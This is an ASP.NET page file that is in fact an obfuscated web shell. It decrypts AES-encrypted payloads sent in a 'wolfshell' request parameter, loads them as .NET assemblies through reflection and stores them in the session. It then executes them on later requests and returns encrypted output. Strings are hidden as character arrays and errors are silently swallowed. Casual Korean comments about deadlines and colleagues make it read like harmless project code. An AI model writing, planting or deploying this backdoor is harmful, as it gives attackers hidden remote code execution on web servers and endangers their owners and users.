<%@ Page Language="C#"%><%@ Import Namespace="System" %><%@ Import Namespace="System.IO" %><%@ Import Namespace="System.Text" %><%@ Import Namespace="System.Reflection" %><%@ Import Namespace="System.Security.Cryptography" %><%
// 배고파요, 치킨 먹고 싶다
try {
    Func<string, byte[]> s_to_b = (s) => Encoding.Default.GetBytes(s);
    Func<byte[], byte[], bool, byte[]> crypto_op = (d, k, is_dec) => {
        using(var p = new RijndaelManaged()) {
            var t = is_dec ? p.CreateDecryptor(k, k) : p.CreateEncryptor(k, k);
            return t.TransformFinalBlock(d, 0, d.Length);
        }
    };
    
    // 프로젝트 마감일이 다가온다...
    var k_str = new string(new char[] {'3','c','6','e','0','b','8','a','9','c','1','5','2','2','4','a'});
    var p_str = new string(new char[] {'w','o','l','f','s','h','e','l','l'});
    
    // 이 코드는 제 동료가 작성했습니다.
    var md5_str = "";
    Action gen_md5 = () => {
        using(var m = new MD5CryptoServiceProvider()) {
            md5_str = BitConverter.ToString(m.ComputeHash(s_to_b(p_str + k_str))).Replace("-", "");
        }
    };
    gen_md5();

    // 여기서 에러가 나면 퇴근 못 할지도
    var req_data = Convert.FromBase64String(Context.Request[p_str]);
    var key_bytes = s_to_b(k_str);
    var decrypted_data = crypto_op(req_data, key_bytes, true);

    var s_key = new string(new char[] {'p','a','y','l','o','a','d'});
    if (Context.Session[s_key] == null)
    {
        // 첫 번째 요청 처리
        Func<byte[], Assembly> load_asm = (b) => (Assembly)Type.GetType(new string(new char[] {'S','y','s','t','e','m','.','R','e','f','l','e','c','t','i','o','n','.','A','s','s','e','m','b','l','y'})).GetMethod(new string(new char[] {'L','o','a','d'}), new Type[] { typeof(byte[]) }).Invoke(null, new object[] { b });
        Context.Session[s_key] = load_asm(decrypted_data);
    }
    else
    {
        // 후속 요청 처리
        Action<Assembly> exec_payload = (asm) => {
            var stream = new MemoryStream();
            var instance = asm.CreateInstance(new string(new char[] {'L','Y'}));
            
            // 이 부분은 정말 이해하기 어렵네요.
            instance.Equals(Context);
            instance.Equals(stream);
            instance.Equals(decrypted_data);
            instance.ToString();
            
            var result_bytes = stream.ToArray();
            var encrypted_result = crypto_op(result_bytes, key_bytes, false);
            
            Context.Response.Write(md5_str.Substring(0, 16));
            Context.Response.Write(Convert.ToBase64String(encrypted_result));
            Context.Response.Write(md5_str.Substring(16));
        };
        exec_payload((Assembly)Context.Session[s_key]);
    }
} catch (Exception) { 
    // 조용히 실패...
}
%>